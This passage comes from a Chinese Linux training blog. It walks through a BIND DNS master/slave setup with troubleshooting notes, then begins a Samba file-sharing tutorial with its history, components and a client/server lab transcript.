<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# cat /etc/resolv.conf</span><br><span class="line"><span class="meta">#</span><span class="bash"> Generated by NetworkManager</span></span><br><span class="line">domain example.com</span><br><span class="line">search example.com</span><br><span class="line">nameserver 172.25.254.254</span><br><span class="line">[root@rhel7 ~]# yum install -y bind*</span><br><span class="line">[root@rhel7 ~]# vim /etc/named.conf</span><br><span class="line">[root@rhel7 ~]# vim /etc/named.rfc1912.zones</span><br><span class="line">zone "uplooking.com" IN &#123;</span><br><span class="line">        type slave;				&lt;== 定义类型为奴隶 slave</span><br><span class="line">        masters &#123; 172.25.0.11; &#125;;		&lt;== 告诉计算机我的主人 master 是谁</span><br><span class="line">        file "slaves/uploooking.com.zone";	&lt;== 告诉计算机 zone 数据库地址在哪里,奴隶有专门的目录</span><br><span class="line">        allow-update &#123; none; &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone "0.25.172.in-addr.arpa" IN &#123;</span><br><span class="line">        type slave;</span><br><span class="line">        masters &#123; 172.25.0.11; &#125;;</span><br><span class="line">        file "slaves/arpa.uplooking.zone";</span><br><span class="line">        allow-update &#123; none; &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>服务启动与关闭</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# systemctl stop firewalld</span><br><span class="line">[root@rhel7 ~]# getenforce</span><br><span class="line">Enforcing</span><br><span class="line">[root@rhel7 ~]# systemctl start named</span><br><span class="line">[root@rhel7 ~]# ll /var/named/slaves</span><br><span class="line">total 8</span><br><span class="line">-rw-r--r--. 1 named named 381 Aug  2 03:54 arpa.uplooking.zone</span><br><span class="line">-rw-r--r--. 1 named named 463 Aug  2 03:54 uploooking.com.zone</span><br></pre></td></tr></table></figure>

<blockquote>
<p>测试</p>
</blockquote>
<p>客户端 rhel7</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# vim /etc/resolv.conf</span><br><span class="line">nameserver 172.25.0.11</span><br><span class="line">[root@rhel7 ~]# nslookup</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> www.uplooking.com</span></span><br><span class="line">Server:		172.25.0.11</span><br><span class="line">Address:	172.25.0.11#53</span><br><span class="line"></span><br><span class="line">Name:	www.uplooking.com</span><br><span class="line">Address: 172.25.0.10</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 172.25.0.10</span></span><br><span class="line">Server:		172.25.0.11</span><br><span class="line">Address:	172.25.0.11#53</span><br><span class="line"></span><br><span class="line">10.0.25.172.in-addr.arpa	name = www.uplooking.com.</span><br><span class="line">10.0.25.172.in-addr.arpa	name = mail.uplooking.com.</span><br><span class="line">10.0.25.172.in-addr.arpa	name = ftp.uplooking.com.</span><br><span class="line">10.0.25.172.in-addr.arpa	name = bbs.uplooking.com.</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 172.25.0.11</span></span><br><span class="line">Server:		172.25.0.11</span><br><span class="line">Address:	172.25.0.11#53</span><br><span class="line"></span><br><span class="line">11.0.25.172.in-addr.arpa	name = uplooking.com.</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">exit</span></span></span><br><span class="line"></span><br><span class="line">[root@rhel7 ~]# vim /etc/resolv.conf</span><br><span class="line">nameserver 172.25.0.10</span><br><span class="line">[root@rhel7 ~]# nslookup</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> www.uplooking.com</span></span><br><span class="line">Server:		172.25.0.10</span><br><span class="line">Address:	172.25.0.10#53</span><br><span class="line"></span><br><span class="line">Name:	www.uplooking.com</span><br><span class="line">Address: 172.25.0.10</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 172.25.0.11</span></span><br><span class="line">Server:		172.25.0.10</span><br><span class="line">Address:	172.25.0.10#53</span><br><span class="line"></span><br><span class="line">11.0.25.172.in-addr.arpa	name = uplooking.com.</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 172.25.0.10</span></span><br><span class="line">Server:		172.25.0.10</span><br><span class="line">Address:	172.25.0.10#53</span><br><span class="line"></span><br><span class="line">10.0.25.172.in-addr.arpa	name = bbs.uplooking.com.</span><br><span class="line">10.0.25.172.in-addr.arpa	name = www.uplooking.com.</span><br><span class="line">10.0.25.172.in-addr.arpa	name = ftp.uplooking.com.</span><br><span class="line">10.0.25.172.in-addr.arpa	name = mail.uplooking.com.</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">exit</span></span></span><br></pre></td></tr></table></figure>

<h3 id="排错记录"><a href="#排错记录" class="headerlink" title="排错记录"></a>排错记录</h3><h4 id="服务启动不了"><a href="#服务启动不了" class="headerlink" title="服务启动不了"></a>服务启动不了</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# systemctl start named</span><br><span class="line">Job for named.service failed. See 'systemctl status named.service' and 'journalctl -xn' for details.</span><br><span class="line"></span><br><span class="line">[root@rhel7 ~]# systemctl status named.service</span><br><span class="line">named.service - Berkeley Internet Name Domain (DNS)</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/named.service; disabled)</span><br><span class="line">   Active: failed (Result: exit-code) since Tue 2016-08-02 04:19:20 EDT; 23s ago</span><br><span class="line">  Process: 2297 ExecStartPre=/usr/sbin/named-checkconf -z /etc/named.conf (code=exited, status=1/FAILURE)</span><br><span class="line"></span><br><span class="line">Aug 02 04:19:20 rhel7 systemd[1]: Starting Berkeley Internet Name Domain (DNS)...</span><br><span class="line">Aug 02 04:19:20 rhel7 named-checkconf[2297]: /etc/named.rfc1912.zones:51: missing ';' before '&#125;'</span><br><span class="line">Aug 02 04:19:20 rhel7 systemd[1]: named.service: control process exited, code=exited status=1</span><br><span class="line">Aug 02 04:19:20 rhel7 systemd[1]: Failed to start Berkeley Internet Name Domain (DNS).</span><br><span class="line">Aug 02 04:19:20 rhel7 systemd[1]: Unit named.service entered failed state.</span><br></pre></td></tr></table></figure>

<p>ps：当服务启动不了的时候，报错内容中说我们可以通过以下两个命令来查看，<code>systemctl status named.service</code> 或者 <code>journalctl -xn</code>此时我们可以去执行以下上面命令中的任何一个，都可以看到详细的报错信息。</p>
<p><code>Aug 02 04:19:20 rhel7 named-checkconf[2297]: /etc/named.rfc1912.zones:51: missing &#39;;&#39; before &#39;}&#39;</code></p>
<p>这条日志告诉我们，在配置文件<code>/etc/named.rfc1912.zones</code>的第51行中，<code>&#39;}&#39;</code>前少了一个<code>&#39;;&#39;</code>。因此我们根据日志中的提示去修改配置文件即可。</p>
<h4 id="服务启动不了-1"><a href="#服务启动不了-1" class="headerlink" title="服务启动不了"></a>服务启动不了</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# systemctl status named</span><br><span class="line">named.service - Berkeley Internet Name Domain (DNS)</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/named.service; disabled)</span><br><span class="line">   Active: failed (Result: exit-code) since Tue 2016-08-02 04:50:39 EDT; 1min 42s ago</span><br><span class="line">  Process: 6541 ExecStartPre=/usr/sbin/named-checkconf -z /etc/named.conf (code=exited, status=1/FAILURE)</span><br><span class="line"></span><br><span class="line">Aug 02 04:50:39 rhel7 named-checkconf[6541]: zone 1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0...al 0</span><br><span class="line">Aug 02 04:50:39 rhel7 named-checkconf[6541]: zone 1.0.0.127.in-addr.arpa/IN: loaded serial 0</span><br><span class="line">Aug 02 04:50:39 rhel7 named-checkconf[6541]: zone 0.in-addr.arpa/IN: loaded serial 0</span><br><span class="line">Aug 02 04:50:39 rhel7 named-checkconf[6541]: zone uplooking.com/IN: loaded serial 20160802</span><br><span class="line">Aug 02 04:50:39 rhel7 named-checkconf[6541]: zone 19.25.172.in-addr.arpa/IN: loading from master file nam...ound</span><br><span class="line">Aug 02 04:50:39 rhel7 named-checkconf[6541]: zone 19.25.172.in-addr.arpa/IN: not loaded due to errors.</span><br><span class="line">Aug 02 04:50:39 rhel7 named-checkconf[6541]: _default/19.25.172.in-addr.arpa/IN: file not found</span><br><span class="line">Aug 02 04:50:39 rhel7 systemd[1]: named.service: control process exited, code=exited status=1</span><br><span class="line">Aug 02 04:50:39 rhel7 systemd[1]: Failed to start Berkeley Internet Name Domain (DNS).</span><br><span class="line">Aug 02 04:50:39 rhel7 systemd[1]: Unit named.service entered failed state.</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@rhel7 ~]# tail -n 15 /etc/named.rfc1912.zones</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone  "uplooking.com" IN &#123;</span><br><span class="line">        type master;</span><br><span class="line">        file "named.uplooking";</span><br><span class="line">        allow-update &#123; none; &#125;;</span><br><span class="line">	allow-transfer &#123; 172.25.19.10;&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone "19.25.172.in-addr.arpa" IN &#123;</span><br><span class="line">        type master;</span><br><span class="line">        file "named.uplooking.arpa";</span><br><span class="line">        allow-update &#123; none; &#125;;</span><br><span class="line">	allow-transfer &#123; 172.25.19.10; &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">[root@rhel7 ~]# ll /var/named/named*</span><br><span class="line">-rw-r-----. 1 root named  330 Aug  2 04:50 /var/named/named.arpa.uplooking</span><br><span class="line">-rw-r-----. 1 root named 2076 Jan 28  2013 /var/named/named.ca</span><br><span class="line">-rw-r-----. 1 root named  152 Dec 15  2009 /var/named/named.empty</span><br><span class="line">-rw-r-----. 1 root named  152 Jun 21  2007 /var/named/named.localhost</span><br><span class="line">-rw-r-----. 1 root named  168 Dec 15  2009 /var/named/named.loopback</span><br><span class="line">-rw-r-----. 1 root named  295 Aug  2 04:50 /var/named/named.uplooking</span><br></pre></td></tr></table></figure>

<p>ps:问题出在数据文件名和配置文件中指定的数据文件名不一致。</p>
<p><code>file &quot;named.uplooking.arpa&quot;;</code></p>
<p><code>/var/named/named.arpa.uplooking</code></p>
<h4 id="主辅同步缓冲文件只有一个"><a href="#主辅同步缓冲文件只有一个" class="headerlink" title="主辅同步缓冲文件只有一个"></a>主辅同步缓冲文件只有一个</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# ll /var/named/slaves/</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r-- 1 named named 386 Jan  1 02:46 uplooking123.zoo</span><br></pre></td></tr></table></figure>

<p>ps:原因是<code>/etc/named.rfc1912.zones</code>中的配置有问题，指定缓冲的目录写少了一个<code>s</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zone \"uplooking.com\" IN &#123;</span><br><span class="line">        type slave;</span><br><span class="line">        masters &#123; 172.25.33.11; &#125;;</span><br><span class="line">        file \"slave/uplooking.zone\";</span><br><span class="line">        allow-update &#123; none; &#125;;</span><br><span class="line">      &#125;;</span><br></pre></td></tr></table></figure>

<h4 id="主辅同步将从机的数据文件指定位置放在非slaves目录"><a href="#主辅同步将从机的数据文件指定位置放在非slaves目录" class="headerlink" title="主辅同步将从机的数据文件指定位置放在非slaves目录"></a>主辅同步将从机的数据文件指定位置放在非slaves目录</h4><p>从服务器的配置文件放置的位置不在slaves目录下，而在其他目录下，则同步不成功。<br>原因从三处排查</p>
<ul>
<li>配置文件</li>
<li>UGO权限</li>
<li>selinux权限</li>
</ul>
<p>此处是由于selinux的问题，我们安装一个工具<code>setroubleshoot</code>帮助我们分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Yum search setroubleshoot</span><br><span class="line">Yum -y install setroubleshoot</span><br><span class="line">Sealert -a audit.log</span><br></pre></td></tr></table></figure>
<p>看到关于布尔值的信息和关于安全上下文的信息:</p>
<ul>
<li>1）设置布尔值setsebool -P named_write_master_zones 1</li>
<li>2）设置安全上下文，通过man named_selinux或者看一下slaves目录的安全上下文是什么<br>根据slaves的安全上下文去改。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Chcon -t named_zone_t test</span><br><span class="line">Chcon -u system_u  -r object_r  test</span><br></pre></td></tr></table></figure>
然后将selinux打开，将test下的目录的同步过来的文件给删除，重启服务，看是否被同步过来。</li>
</ul>
<p>同步成功。</p>
<h4 id="如果启动服务时候太慢"><a href="#如果启动服务时候太慢" class="headerlink" title="如果启动服务时候太慢"></a>如果启动服务时候太慢</h4><p>可以使用<code>/usr/sbin/rndc-confgen -a -r /etc/named.conf</code></p>
<p>这是一个秘钥加密产生的bug</p>
<h4 id="有顺序的批量配置的写法：（简单了解一下）"><a href="#有顺序的批量配置的写法：（简单了解一下）" class="headerlink" title="有顺序的批量配置的写法：（简单了解一下）"></a>有顺序的批量配置的写法：（简单了解一下）</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">GENERATE 1-100 stu$   A   172.25.0.$</span></span><br><span class="line"><span class="meta">$</span><span class="bash">GENERATE 1-200 $ PTR foundation$.ilt.example.com</span></span><br></pre></td></tr></table></figure>

<h4 id="从机数据文件的查看"><a href="#从机数据文件的查看" class="headerlink" title="从机数据文件的查看"></a>从机数据文件的查看</h4><p><strong>7版本上无法查看</strong>：因为从机在slaves目录下生成的配置文件是data类型的。<br><strong>6版本上可以查看</strong>：老版本是可以查看的。</p>
<hr>
<h3 id="配置文件详细解析"><a href="#配置文件详细解析" class="headerlink" title="配置文件详细解析"></a>配置文件详细解析</h3><h4 id="主配置文件-etc-named-conf"><a href="#主配置文件-etc-named-conf" class="headerlink" title="主配置文件/etc/named.conf"></a>主配置文件/etc/named.conf</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Options 全局的配置行   </span><br><span class="line">options &#123; //服务器的全局配置选项及一些默认设置</span><br><span class="line">        listen-on port 53 &#123; any; &#125;; //监听端口默认监听53号端口，也可写为 &#123; 127.0.0.1; 192.168.139.46; &#125;</span><br><span class="line">        listen-on-v6 port 53 &#123; ::1; &#125;; //对ip6支持</span><br><span class="line">        directory       "/var/named";  //区域文件存储目录</span><br><span class="line">        dump-file       "/var/named/data/cache_dump.db"; //缓存的目录directory</span><br><span class="line">        statistics-file "/var/named/data/named_stats.txt";  // 状态信息文件</span><br><span class="line">        memstatistics-file "/var/named/data/named_mem_stats.txt";   //内存信息文件</span><br><span class="line">        pid-file        "/var/run/named/named.pid"; //存着named的pid</span><br><span class="line">        forwarders     &#123; 168.95.1.1; 139.175.10.20; &#125;; // 如果域名服务器无法解析时，将请求交由168.95.1.1; 139.175.10.20来解析</span><br><span class="line">        allow-query    &#123; any; &#125;;   //指定允许进行查询的主机，当然是要所有的电脑都可以查啦</span><br><span class="line">        allow-transfer &#123; none; &#125;; //指定允许接受区域传送请求的主机，说明白一点就是辅dns定义，比如辅dns的ip是192.168.139.5，那么可以这样定义&#123; 192.168.139.5; &#125;，要不然主辅dns不能同步，当然，&#123;&#125;里的也可以用下面提到的acl。</span><br><span class="line">        // those options should be used carefully because they disable port</span><br><span class="line">        // randomization</span><br><span class="line">        // query-source    port 53;     </span><br><span class="line">        // query-source-v6 port 53;</span><br><span class="line">Dnssec开头的是一些加密文件</span><br><span class="line">Xxxx.key是一些秘钥文件</span><br><span class="line">&#125;;</span><br><span class="line">logging &#123; //指定服务器日志记录的内容和日志信息来源</span><br><span class="line">        channel default_debug &#123;</span><br><span class="line">                file "data/named.run";</span><br><span class="line">                severity dynamic;</span><br><span class="line">        &#125;;</span><br><span class="line">&#125;;</span><br><span class="line">zone "." IN &#123; //在这个文件中是用zone关键字来定义域区的，一个zone关键字定义一个域区 </span><br><span class="line">type hint; </span><br><span class="line">/*在这里type类型有三种，它们分别是master,slave和hint它们的含义分别是： </span><br><span class="line">master:表示定义的是主域名服务器 </span><br><span class="line">slave :表示定义的是辅助域名服务器 </span><br><span class="line">hint:表示是互联网中根域名服务器 </span><br><span class="line">*/ </span><br><span class="line">Include  "/etc/named.rfc1912.conf"</span><br><span class="line">Include  "/etc/named.root.key"  //两个include字段代表读取本配置文件时候同时读取/etc/named.rfc1912.conf和/etc/named.root.key文件，这里主要关注第一个文件，该文件是专门用于定义域的文件。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>allow-query-cache</code>主辅同步时:</strong></p>
<ul>
<li>6版本上必须加上 不然会报错</li>
<li>7版本不用</li>
</ul>
<p><strong><code>recursion</code>主辅同步时</strong> 必须是yes，关掉之后会阻止新纪录进入到缓冲。</p>
<h4 id="named-rfc1912-conf"><a href="#named-rfc1912-conf" class="headerlink" title="named.rfc1912.conf"></a>named.rfc1912.conf</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Zone "域名 "IN &#123;</span><br><span class="line">File ;域对应的数据文件</span><br><span class="line">Allow-update ;是否需要更新</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong></p>
<ol>
<li>所有语句结束后都需要一个分号代表结束符</li>
<li>括号必须成对出现</li>
<li>file指向的数据文件写的是相对路径，相对于主配置文件的dirctory配置字段，即相对于/var/named目录。</li>
</ol>
<p><strong>主辅同步中slave需要的配置</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Zone "域名" IN &#123;</span><br><span class="line">Type slave;</span><br><span class="line">Masters &#123; 172.25.0.11;&#125; ;</span><br><span class="line">File "slaves/test.com.zone";</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="数据文件-var-named-named-localhost"><a href="#数据文件-var-named-named-localhost" class="headerlink" title="数据文件/var/named/named.localhost"></a>数据文件/var/named/named.localhost</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">TTL //代表周期，缓存时间，DNS会自己做缓存，1D就代表一天，缓存时间为一天。</span><br><span class="line">SOA //记录  --&gt;起始授权记录  @代表继承域名  </span><br><span class="line">IN  SOA @ 用户名.域名  &#123;</span><br><span class="line">     0;serial    //序列号；一般写修改当天日期，从服务器根据该序列号来判定文件是否修改过。</span><br><span class="line">     1D；refresh  // 多久做一次同步</span><br><span class="line">     1H；retry    //重置时间，同步不成功时，间隔多久重新做一次同步</span><br><span class="line">     1W；expire   //当重复同步不成功时，多久不再做同步。</span><br><span class="line">	 3H；minimun  //最小缓存时间，一般是错误缓存。假设有一个人，一直问我一个错误的域名，那我就会将该错误的域名缓存下来，</span><br><span class="line">当人再来问我时，我就不再搜寻，而将该结果反馈给他。</span><br><span class="line"></span><br><span class="line">这里将serial一列改为当前日期。</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NS代表的是正向记录  ，解析还分成正向解析和反向解析，正向解析就是知道主机名，想要搜寻IP地址。这里先来看正向解析</span><br><span class="line"></span><br><span class="line">@代表继承域名</span><br><span class="line">   NS    @</span><br><span class="line">   A    127.0.0.1    </span><br><span class="line">这句话代表，我的域名是localhost，localhost指向的是127.0.0.1</span><br><span class="line">如果不写@而写成域名，就应该写成test.com.   Com后面必须有个点，代表根域的意思。</span><br></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>掌握实践项目<br><img src="pic/02.png" alt="02"></p>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux简易服务教程</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux基础服务</tag>
      </tags>
  </entry>
  <entry>
    <title>SAMBA文件共享服务</title>
    <url>/2016/12/23/booboo_easy_service/04_samba/</url>
    <content><![CDATA[<h3 id="Samba的历史及原理"><a href="#Samba的历史及原理" class="headerlink" title="Samba的历史及原理"></a>Samba的历史及原理</h3><p>在早期的网络世界中，文件数据在不同主机之间的传输大多是使用FTP这个好用的服务器软件进行的。不过，使用FTP传输文件却有个小小的问题，那就是您无法直接修改主机上面的文件数据。也就是说，您想要更改Linux主机上面的某个文件时，必须要由服务器端将该文件下载到您工作的客户端后才能修改，因此该文件在服务器端和客户端都会存在。这时，如果有一天您修改了某个文件，却忘记将数据上传回主机，那么等过了一阵子之后，您如何知道哪既然有这样的问题，那好吧，我可不可以在客户端的机器上面直接取用服务器上面的文件？如果可以在客户端直接进行服务器端文件的访问，那么我在客户端就不需要存在该文件数据了，也就是说，我只要有服务器上面的文件数据存在就可以了。有没有这样的文件系统（File System）呢？前面我们提到过的Network File System（NFS）就是这样的文件系统之一。只要在客户端将服务器端所提供的共享目录挂载进来，那么在我的客户端就可以直接取用服务器上的文件数据，而且，该数据就像是客户端上的分区一样，非常好用！而除了可以让Unix Like的机器互相分享文件的NFS服务器之外，在微软（Microsoft）上面也有类似的文件系统，那就是Common Internet File System（CIFS）。CIFS最简单的用途就是目前常见的“网上邻居”。Windows系统的计算机可以通过桌面上的“网上邻居”来访问别人所提供的文件数据。不过，NFS仅能让Unix机器沟通，CIFS只能让Windows机器沟通。那么有没有让Windows与Unix Like这两个不同的平台相互分享文件数据的文件系统呢？个文件才是最新的？</p>
<p>在1991年，一个名叫Andrew Tridgwell的大学生就有这样的困扰，他手上有三台机器，分别是运行DOS的个人计算机、DEC公司的Digital Unix系统以及Sun的Unix系统。在当时，DEC 公司开发出一套称为PATHWORKS的软件，这套软件可以用来分享DEC的Unix与个人计算机的DOS这两个操作系统的文件数据，可惜让Tridgwell觉得较困扰的是Sun的Unix无法通过这个软件来达到文件共享的目的。这个时候Tridgwell就想：“咦！既然这两台系统可以共享，没道理Sun就必须这么苦命吧？可不可以将这两个系统的工作原理找出来，然后让Sun机器也能够共享文件数据呢？”，为了解决这样的的问题，Tridgwell就自行编写了一个程序去检测当DOS与DEC的Unix系统在进行文件分享传输时所使用到的通信协议信息，然后获取这些重要的信息，并且基于上述所找到的通信协议而开发出Server Message Block（SMB）这个文件系统，而就是这套SMB软件就能够让Unix与DOS互相共享文件。</p>
<p>既然写成了软件，总需要注册商标，因此Tridgwell就申请SMB Server作为该软件的商标。可惜因为SMB是没有意义的文字，没有办法达成注册。既然如此，能不能在字典里面找到相关的字词可以作为商标来注册呢？翻了老半天，发现SAMBA刚好含有SMB，又是热情有劲的拉丁舞蹈的名称，不然就用这个名字来作为商标好了。这成为我们今天所使用的SAMBA的名称的由来。</p>
<h3 id="Samba的作用"><a href="#Samba的作用" class="headerlink" title="Samba的作用"></a>Samba的作用</h3><p>作用：windows和类unix系统文件共享服务</p>
<h3 id="Samba的软件结构"><a href="#Samba的软件结构" class="headerlink" title="Samba的软件结构"></a>Samba的软件结构</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 服务端linux</span></span><br><span class="line"></span><br><span class="line">软件		samba samba-common</span><br><span class="line">service		nmb	smb</span><br><span class="line">daemon		nmbd	smbd</span><br><span class="line">端口		137 138|139 445</span><br><span class="line">配置文件		/etc/samba/smb.conf</span><br><span class="line">数据文件		/var/lib/samba</span><br><span class="line">日志文件		/var/log/samba</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 客户端linux</span></span><br><span class="line">软件		samba-client</span><br><span class="line">命令		smbclient</span><br><span class="line">		smbclient -L ip -U username</span><br><span class="line">		smbpasswd -a username</span><br><span class="line">		smbpasswd username</span><br><span class="line">		smbclient //172.25.0.11/共享名</span><br><span class="line">		smbclient //172.25.0.11/共享名 -U student</span><br><span class="line">		mount -t cifs //172.25.15.11/共享名 /mnt -o guest</span><br><span class="line">		mount -t cifs //172.25.15.11/共享名 /mnt -o username=student</span><br></pre></td></tr></table></figure>
<h3 id="项目实践1：配置samba共享"><a href="#项目实践1：配置samba共享" class="headerlink" title="项目实践1：配置samba共享"></a>项目实践1：配置samba共享</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">系统用户</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###########</span></span></span><br><span class="line">服务器端rhel6</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###########</span></span></span><br><span class="line">[root@rhel6 ~]# yum install -y samba samba-common</span><br><span class="line">[root@rhel6 ~]# service iptables stop</span><br><span class="line">iptables: Setting chains to policy ACCEPT: filter          [  OK  ]</span><br><span class="line">iptables: Flushing firewall rules:                         [  OK  ]</span><br><span class="line">iptables: Unloading modules:                               [  OK  ]</span><br><span class="line">[root@rhel6 ~]#</span><br><span class="line">[root@rhel6 ~]# service smb start</span><br><span class="line">Starting SMB services:                                     [  OK  ]</span><br><span class="line">[root@rhel6 ~]# service nmb start</span><br><span class="line">Starting NMB services:                                     [  OK  ]</span><br><span class="line">[root@rhel6 ~]# id student</span><br><span class="line">uid=500(student) gid=500(student) groups=500(student)</span><br><span class="line">[root@rhel6 ~]# which smbpasswd</span><br><span class="line">/usr/bin/smbpasswd</span><br><span class="line">[root@rhel6 ~]# smbpasswd -a student</span><br><span class="line">New SMB password:</span><br><span class="line">Retype new SMB password:</span><br><span class="line">Added user student.</span><br><span class="line">[root@rhel6 ~]# getsebool -a|grep samba</span><br><span class="line">samba_create_home_dirs --&gt; off</span><br><span class="line">samba_domain_controller --&gt; off</span><br><span class="line">samba_enable_home_dirs --&gt; off</span><br><span class="line">samba_export_all_ro --&gt; off</span><br><span class="line">samba_export_all_rw --&gt; off</span><br><span class="line">samba_portmapper --&gt; off</span><br><span class="line">samba_run_unconfined --&gt; off</span><br><span class="line">samba_share_fusefs --&gt; off</span><br><span class="line">samba_share_nfs --&gt; off</span><br><span class="line">sanlock_use_samba --&gt; off</span><br><span class="line">use_samba_home_dirs --&gt; off</span><br><span class="line">virt_use_samba --&gt; off</span><br><span class="line">[root@rhel6 ~]# setsebool -P samba_enable_home_dirs 1</span><br><span class="line">[root@rhel6 ~]# getsebool -a|grep samba</span><br><span class="line">samba_create_home_dirs --&gt; off</span><br><span class="line">samba_domain_controller --&gt; off</span><br><span class="line">samba_enable_home_dirs --&gt; on</span><br><span class="line">samba_export_all_ro --&gt; off</span><br><span class="line">samba_export_all_rw --&gt; off</span><br><span class="line">samba_portmapper --&gt; off</span><br><span class="line">samba_run_unconfined --&gt; off</span><br><span class="line">samba_share_fusefs --&gt; off</span><br><span class="line">samba_share_nfs --&gt; off</span><br><span class="line">sanlock_use_samba --&gt; off</span><br><span class="line">use_samba_home_dirs --&gt; off</span><br><span class="line">virt_use_samba --&gt; off</span><br><span class="line">-----------------------------------</span><br><span class="line"><span class="meta">#</span><span class="bash"> 客户端linux——类似ftp的方式访问</span></span><br><span class="line">[root@rhel7 ~]# systemctl stop firewalld</span><br><span class="line">[root@rhel7 ~]# yum install -y samba-client</span><br><span class="line">[root@rhel7 ~]# smbclient -L 172.25.0.11</span><br><span class="line">Enter root\'s password:</span><br><span class="line">Anonymous login successful</span><br><span class="line">Domain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6]</span><br><span class="line"></span><br><span class="line">	Sharename       Type      Comment</span><br><span class="line">	---------       ----      -------</span><br><span class="line"><span class="meta">	IPC$</span><span class="bash">            IPC       IPC Service (Samba Server Version 3.6.9-164.el6)</span></span><br><span class="line">Anonymous login successful</span><br><span class="line">Domain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6]</span><br><span class="line"></span><br><span class="line">	Server               Comment</span><br><span class="line">	---------            -------</span><br><span class="line">	RHEL6                Samba Server Version 3.6.9-164.el6</span><br><span class="line"></span><br><span class="line">	Workgroup            Master</span><br><span class="line">	---------            -------</span><br><span class="line">	MYGROUP              RHEL6</span><br><span class="line">[root@rhel7 ~]# smbclient -L 172.25.0.11 -U student</span><br><span class="line">Enter student\'s password:</span><br><span class="line">Domain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6]</span><br><span class="line"></span><br><span class="line">	Sharename       Type      Comment</span><br><span class="line">	---------       ----      -------</span><br><span class="line"><span class="meta">	IPC$</span><span class="bash">            IPC       IPC Service (Samba Server Version 3.6.9-164.el6)</span></span><br><span class="line">	student         Disk      Home Directories</span><br><span class="line">Domain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6]</span><br><span class="line"></span><br><span class="line">	Server               Comment</span><br><span class="line">	---------            -------</span><br><span class="line">	RHEL6                Samba Server Version 3.6.9-164.el6</span><br><span class="line"></span><br><span class="line">	Workgroup            Master</span><br><span class="line">	---------            -------</span><br><span class="line">	MYGROUP              RHEL6</span><br><span class="line">[root@rhel7 ~]# smbclient //172.25.0.11/student -U student</span><br><span class="line">Enter student\'s password:</span><br><span class="line">Domain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.9-164.el6]</span><br><span class="line">smb: \&gt;</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \*</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Thu Jul  2 04:01:16 2015</span><br><span class="line">  ..                                  D        0  Thu Jul  2 03:57:29 2015</span><br><span class="line">  .ssh                               DH        0  Thu Jul  2 04:01:07 2015</span><br><span class="line">  .bashrc                             H      124  Tue Jul  9 09:24:50 2013</span><br><span class="line">  .bash_logout                        H       18  Tue Jul  9 09:24:50 2013</span><br><span class="line">  .mozilla                           DH        0  Thu Jul  2 03:36:20 2015</span><br><span class="line">  .bash_history                       H        5  Thu Jul  2 04:01:16 2015</span><br><span class="line">  .gnome2                            DH        0  Wed Jul 14 11:55:40 2010</span><br><span class="line">  .bash_profile                       H      176  Tue Jul  9 09:24:50 2013</span><br><span class="line"></span><br><span class="line">		49584 blocks of size 8192. 45708 blocks available</span><br><span class="line">smb: \&gt; exit</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line"><span class="meta">#</span><span class="bash"> 客户端windows</span></span><br><span 